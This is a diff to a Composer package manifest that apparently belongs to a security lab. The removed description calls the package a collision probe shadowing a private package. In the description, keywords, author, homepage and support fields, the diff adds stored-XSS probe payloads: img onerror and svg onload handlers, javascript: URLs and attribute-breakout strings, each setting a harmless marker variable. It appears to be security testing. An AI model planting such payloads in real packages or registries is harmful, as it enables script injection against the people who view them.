@@ -1,8 +1,24 @@
 {
     "name": "dgseclab/vcs-one",
-    "description": "COLLISION PROBE - shadows an existing private package in the same org",
+    "description": "ZQ1MARK<img src=x onerror=window.__x1=1>\"><b>ZQ1B</b>",
     "type": "library",
     "license": "MIT",
+    "homepage": "javascript:window.__x2=1//ZQ2MARK",
+    "keywords": ["ZQ3MARK<svg onload=window.__x3=1>"],
+    "authors": [
+        {
+            "name": "ZQ4MARK<img src=x onerror=window.__x4=1>",
+            "email": "zq5@example.com\"><img src=x onerror=window.__x5=1>",
+            "homepage": "javascript:window.__x6=1//ZQ6MARK",
+            "role": "ZQ7MARK<i>dev</i>"
+        }
+    ],
+    "support": {
+        "issues": "javascript:window.__x8=1//ZQ8MARK",
+        "source": "javascript:window.__x9=1//ZQ9MARK",
+        "docs": "ZQ10MARK\"><img src=x onerror=window.__x10=1>",
+        "email": "zq11@example.com"
+    },
     "require": { "php": ">=8.0" },
     "autoload": { "psr-4": { "DgSecLab\\VcsOne\\": "src/" } }
 }
